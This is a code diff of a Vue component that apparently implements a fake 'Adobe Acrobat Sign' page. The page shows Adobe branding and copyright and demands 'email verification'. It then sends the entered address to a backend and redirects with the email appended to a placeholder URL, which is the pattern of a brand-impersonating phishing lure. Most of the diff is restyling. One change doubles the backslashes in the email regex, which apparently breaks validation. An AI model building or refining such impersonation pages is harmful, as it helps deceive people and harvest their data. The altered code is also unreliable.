@@ -2,17 +2,15 @@
   <div class="background">
     <div class="adobe-sign-container">
       <div class="sign-card">
-        <header class="header">
+        <div class="header">
           <div class="logo-text">
-            <!-- Replace with your real logo if you have one -->
-            <img src="@/assets/adobe-logo.svg" alt="Adobe Logo" class="adobe-logo" />
+            <span class="success-check">⼈</span>
             <span>Adobe Acrobat Sign</span>
           </div>
-          <div class="success-check">✔︎</div>
-        </header>
+        </div>
 
         <div class="content">
-          <p><strong>Email verification required.</strong></p>
+          <p><strong>Email verification required.</strong></p> 
           <input
             v-model="email"
             type="email"
@@ -38,12 +36,12 @@
 
         <div class="divider"></div>
 
-        <footer class="footer-container">
+        <div class="footer-container">
           <p class="footer-text">© 2025 Adobe. All rights reserved.</p>
           <div class="global-footer">
-            <!-- any global links or info here -->
+            <!-- optional global footer links here -->
           </div>
-        </footer>
+        </div>
       </div>
     </div>
   </div>
@@ -60,7 +58,7 @@ const holdDuration = 1500
 const redirectBaseUrl = 'https://yourdomain.com/complete'
 
 function isValidEmail(e) {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
+  return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(e)
 }
 
 async function verifyEmail() {
@@ -77,9 +75,7 @@ async function verifyEmail() {
     if (!res.ok || !data.valid) {
       throw new Error(data.message || 'Verification failed')
     }
-    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(
-      email.value
-    )}`
+    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`
   } catch (err) {
     error.value = err.message
   } finally {
@@ -112,32 +108,16 @@ function cancelHold() {
 }
 </script>
 
-<!-- global styles must be unscoped -->
-<style>
-html, body, #app {
-  height: 100%;
-  margin: 0;
-}
-</style>
-
-<!-- component-specific styles -->
 <style scoped>
 .background {
-  min-height: 100vh;
   padding: 2rem;
   font-family: Arial, sans-serif;
   background-color: #f4f4f4;
-  display: flex;
-  align-items: center;
-  justify-content: center;
 }
 
 .adobe-sign-container {
-  width: 100%;
   max-width: 400px;
-}
-
-.sign-card {
+  margin: auto;
   background: white;
   border-radius: 10px;
   box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
@@ -146,20 +126,15 @@ html, body, #app {
 
 .header {
   display: flex;
-  justify-content: space-between;
-  align-items: center;
+  justify-content: center;
   margin-bottom: 1rem;
 }
 
 .logo-text {
+  font-weight: bold;
   display: flex;
   align-items: center;
-  font-weight: bold;
-}
-
-.adobe-logo {
-  height: 24px;
-  margin-right: 0.5rem;
+  gap: 0.5rem;
 }
 
 .success-check {
@@ -177,11 +152,6 @@ html, body, #app {
   margin: 1rem 0;
   border: 1px solid #ccc;
   border-radius: 5px;
-}
-
-.error {
-  color: red;
-  font-size: 0.9rem;
 }
 
 .action-button {
@@ -219,5 +189,10 @@ html, body, #app {
   font-size: 0.85rem;
   color: #333;
   margin-top: 0.5rem;
+}
+
+.error {
+  color: red;
+  font-size: 0.9rem;
 }
 </style>
